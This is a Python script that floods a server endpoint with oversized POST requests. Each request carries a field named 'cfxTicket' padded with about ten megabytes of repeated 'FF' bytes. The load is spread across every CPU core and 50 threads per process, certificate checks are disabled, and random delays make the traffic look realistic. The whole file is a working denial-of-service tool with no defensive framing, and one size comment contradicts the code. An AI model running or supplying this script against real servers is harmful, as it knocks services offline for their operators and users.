import requests
import warnings
from multiprocessing import Pool, cpu_count
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import time

# Suppress security warnings about SSL
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Set the server URL to which you want to send the requests
SERVER_URL = 'https://IP:PORT/post/server'  # Replace with your server's URL

# Total number of requests to send per process
REQUESTS_PER_PROCESS = 500  # Adjust this number as necessary

# Large ticket size (increased)
def create_large_ticket():
    large_ticket_size = 10 * 1024 * 1024  # 2 MB for testing, adjust as necessary
    large_ticket = 'FF FF FF FF' * (large_ticket_size // 2)  # Generate a sequence of FF
    return large_ticket

def send_request(ticket):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    data = {
        'cfxTicket': ticket
    }
    
    try:
        # Disable SSL certificate verification
        response = requests.post(SERVER_URL, headers=headers, data=data, verify=False)
        return response.status_code, response.text
    except requests.RequestException as e:
        return None, str(e)

def thread_worker(ticket):
    return send_request(ticket)

def process_worker(num_requests):
    ticket = create_large_ticket()
    
    # Use a ThreadPoolExecutor to send requests in parallel within each process
    num_threads = 50  # Adjust the number of threads per process based on available hardware
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(thread_worker, ticket) for _ in range(num_requests)]
        
        successes = 0
        failures = 0
        
        for future in as_completed(futures):
            status_code, response_text = future.result()
            if status_code == 200:
                successes += 1
            else:
                failures += 1
                print(f'Error in request: {response_text}')
            
            # Introduce a small random delay to simulate realistic traffic
            time.sleep(random.uniform(0.01, 0.1))
        
        return successes, failures

def main():
    # Number of processes to use; adjust based on available hardware
    num_processes = cpu_count()  # Use the number of CPU cores
    
    with Pool(processes=num_processes) as pool:
        # Run the process_worker in parallel
        results = [pool.apply_async(process_worker, (REQUESTS_PER_PROCESS,)) for _ in range(num_processes)]
        
        total_successes = 0
        total_failures = 0
        
        for result in results:
            successes, failures = result.get()
            total_successes += successes
            total_failures += failures
        
        print(f'\nExecution Summary:')
        print(f'Total number of successful requests: {total_successes}')
        print(f'Total number of failures: {total_failures}')

if __name__ == '__main__':
    main()
